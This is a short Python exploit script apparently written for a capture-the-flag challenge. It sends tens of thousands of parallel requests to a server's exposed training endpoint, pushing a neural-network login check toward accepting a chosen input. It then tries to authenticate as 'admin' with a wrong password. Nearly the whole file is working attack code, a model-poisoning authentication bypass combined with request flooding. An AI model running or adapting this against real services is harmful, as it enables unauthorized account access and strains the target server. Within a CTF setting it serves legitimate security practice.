import asyncio
import aiohttp

BASE_URL = "https://ad8e2ff40972ea667ddee04fd56dfed4-nn-logic.ctf.cybertalent.no"

async def train_step(session, x1, x2, y):
    try:
        async with session.post(
            f"{BASE_URL}/train/step",
            json={"x1": x1, "x2": x2, "y": y}
        ) as response:
            return await response.json()
    except:
        return {"loss": -1}

async def main():
    connector = aiohttp.TCPConnector(limit=50)
    async with aiohttp.ClientSession(connector=connector) as session:
        
        # Much more training
        print("[*] Training (1,0) -> 1 in parallel...")
        batch_size = 100
        total_steps = 50000  # Much more!
        
        for batch in range(0, total_steps, batch_size):
            tasks = [train_step(session, 1, 0, 1) for _ in range(batch_size)]
            results = await asyncio.gather(*tasks)
            
            # Get valid losses
            valid_losses = [r.get('loss', -1) for r in results if r.get('loss', -1) > 0]
            if valid_losses:
                loss = min(valid_losses)  # Best loss in batch
                print(f"  Step {batch+batch_size}: loss = {loss:.6f}")
                
                if loss < 0.01:
                    print("  ✓ Converged!")
                    break
        
        # Login
        print("\n[*] Attempting login as admin...")
        async with session.post(
            f"{BASE_URL}/authenticate",
            data={"username": "admin", "password": "wrongpassword"},
            allow_redirects=True
        ) as resp:
            print(await resp.text())

asyncio.run(main())
